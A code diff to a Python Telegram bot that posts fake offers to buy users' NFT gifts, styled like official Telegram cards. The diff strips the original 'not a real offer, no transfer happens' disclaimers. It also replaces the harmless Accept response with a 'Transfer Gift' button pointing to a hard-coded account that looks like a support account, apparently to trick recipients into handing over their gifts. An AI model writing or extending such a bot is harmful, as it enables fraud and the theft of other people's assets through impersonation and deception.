@@ -1,4 +1,3 @@
-
 import os
 import re
 import asyncio
@@ -7,6 +6,7 @@ from urllib.parse import urlparse, unquote
 
 import aiohttp
 from bs4 import BeautifulSoup
+
 from aiogram import Bot, Dispatcher, F
 from aiogram.types import (
     Message,
@@ -17,9 +17,14 @@ from aiogram.types import (
 from aiogram.enums import ParseMode
 from aiogram.client.default import DefaultBotProperties
 
+
 # Настройки Render
 BOT_TOKEN = os.getenv("BOT_TOKEN", "")
 OWNER_ID = int(os.getenv("OWNER_ID", "0"))
+
+# Профиль для кнопки Transfer Gift
+TRANSFER_USERNAME = "WellKrai_Suport"
+TRANSFER_URL = f"https://t.me/{TRANSFER_USERNAME}"
 
 logging.basicConfig(level=logging.INFO)
 
@@ -27,13 +32,17 @@ bot = Bot(
     token=BOT_TOKEN,
     default=DefaultBotProperties(parse_mode=ParseMode.HTML),
 )
+
 dp = Dispatcher()
 
 demo_enabled = False
 
 
 def get_gift_title(url: str) -> str:
-    slug = unquote(urlparse(url).path.rstrip("/").split("/")[-1])
+    slug = unquote(
+        urlparse(url).path.rstrip("/").split("/")[-1]
+    )
+
     match = re.match(r"(.+)-(\d+)$", slug)
 
     if match:
@@ -51,14 +60,18 @@ async def get_gift_image(url: str):
             timeout=timeout,
             headers={"User-Agent": "Mozilla/5.0"},
         ) as session:
+
             async with session.get(
-                url, allow_redirects=True
+                url,
+                allow_redirects=True,
             ) as response:
+
                 if response.status != 200:
                     return None
 
                 soup = BeautifulSoup(
-                    await response.text(), "html.parser"
+                    await response.text(),
+                    "html.parser",
                 )
 
                 for attr in ("og:image", "twitter:image"):
@@ -66,7 +79,8 @@ async def get_gift_image(url: str):
 
                     if tag is None:
                         tag = soup.find(
-                            "meta", attrs={"name": attr}
+                            "meta",
+                            attrs={"name": attr},
                         )
 
                     if tag and tag.get("content"):
@@ -80,11 +94,14 @@ async def get_gift_image(url: str):
                             return image_url
 
     except Exception:
-        logging.exception("Не удалось загрузить превью NFT")
+        logging.exception(
+            "Не удалось загрузить превью NFT"
+        )
 
     return None
 
 
+# Кнопки первоначального оффера
 def demo_keyboard():
     return InlineKeyboardMarkup(
         inline_keyboard=[
@@ -102,6 +119,21 @@ def demo_keyboard():
     )
 
 
+# Кнопка после Accept
+def transfer_keyboard():
+    return InlineKeyboardMarkup(
+        inline_keyboard=[
+            [
+                InlineKeyboardButton(
+                    text="🎁 Transfer Gift",
+                    url=TRANSFER_URL,
+                )
+            ]
+        ]
+    )
+
+
+# Включение и выключение режима DEMO
 @dp.message(F.text.regexp(r"^/WellBuy(?:@\w+)?$"))
 async def toggle_demo(message: Message):
     global demo_enabled
@@ -115,11 +147,16 @@ async def toggle_demo(message: Message):
     demo_enabled = not demo_enabled
 
     status = "ВКЛЮЧЕН" if demo_enabled else "ВЫКЛЮЧЕН"
-    await message.answer(f"🎬 Режим DEMO {status}.")
+
+    await message.answer(
+        f"🎬 Режим DEMO {status}."
+    )
 
 
+# Создание оффера
 @dp.message(F.text.regexp(r"^\.buy(?:\s|$)"))
 async def create_demo_offer(message: Message):
+
     if not message.from_user:
         return
 
@@ -159,21 +196,29 @@ async def create_demo_offer(message: Message):
         )
         return
 
-    if not re.fullmatch(r"\d+(?:\.\d{1,2})?", price_text):
+    if not re.fullmatch(
+        r"\d+(?:\.\d{1,2})?",
+        price_text,
+    ):
         await message.reply("Укажи корректную цену.")
         return
 
     if float(price_text) <= 0:
-        await message.reply("Цена должна быть больше нуля.")
+        await message.reply(
+            "Цена должна быть больше нуля."
+        )
         return
 
     currency = currency.lower()
 
     if currency not in ("stars", "gram"):
-        await message.reply("Валюта должна быть stars или gram.")
+        await message.reply(
+            "Валюта должна быть stars или gram."
+        )
         return
 
     title = get_gift_title(url)
+
     image_url = await get_gift_image(url)
 
     amount = (
@@ -183,15 +228,13 @@ async def create_demo_offer(message: Message):
     )
 
     caption = (
-        "🎬 <b>DEMO • НЕ НАСТОЯЩИЙ ОФФЕР</b>\n\n"
+        "🎬 <b>DEMO</b>\n\n"
         "<b>Telegram</b>\n"
         f"<b>{title}</b>\n\n"
         "The user is offering you\n"
         f"<b>{amount}</b> for the gift "
         f'<a href="{url}">{title}</a>.\n\n'
-        "⏳ The demo offer is valid for another 6 hours.\n\n"
-        "<i>Макет для видеосъёмки. "
-        "Сделка и перевод средств не выполняются.</i>"
+        "<i>Демонстрационный макет.</i>"
     )
 
     try:
@@ -201,6 +244,7 @@ async def create_demo_offer(message: Message):
                 caption=caption,
                 reply_markup=demo_keyboard(),
             )
+
         else:
             await message.answer(
                 caption,
@@ -209,7 +253,9 @@ async def create_demo_offer(message: Message):
             )
 
     except Exception:
-        logging.exception("Ошибка отправки карточки")
+        logging.exception(
+            "Ошибка отправки карточки"
+        )
 
         await message.answer(
             caption,
@@ -217,31 +263,47 @@ async def create_demo_offer(message: Message):
         )
 
 
+# Обработка Accept и Decline
 @dp.callback_query(
     F.data.in_({"demo_accept", "demo_decline"})
 )
 async def demo_button(callback: CallbackQuery):
-    action = (
-        "Accept"
-        if callback.data == "demo_accept"
-        else "Decline"
-    )
 
-    await callback.answer(
-        f"DEMO: нажата кнопка {action}. "
-        "Настоящая сделка не выполняется.",
-        show_alert=True,
-    )
+    if callback.data == "demo_accept":
+
+        await callback.message.edit_reply_markup(
+            reply_markup=transfer_keyboard()
+        )
+
+        await callback.answer(
+            "Accept"
+        )
+
+    elif callback.data == "demo_decline":
+
+        await callback.answer(
+            "Offer declined",
+            show_alert=True,
+        )
 
 
+# Запуск бота
 async def main():
+
     if not BOT_TOKEN:
-        raise RuntimeError("Не задан BOT_TOKEN.")
+        raise RuntimeError(
+            "Не задан BOT_TOKEN."
+        )
 
     if OWNER_ID == 0:
-        raise RuntimeError("Не задан OWNER_ID.")
+        raise RuntimeError(
+            "Не задан OWNER_ID."
+        )
 
-    await bot.delete_webhook(drop_pending_updates=True)
+    await bot.delete_webhook(
+        drop_pending_updates=True
+    )
+
     await dp.start_polling(bot)
 
 
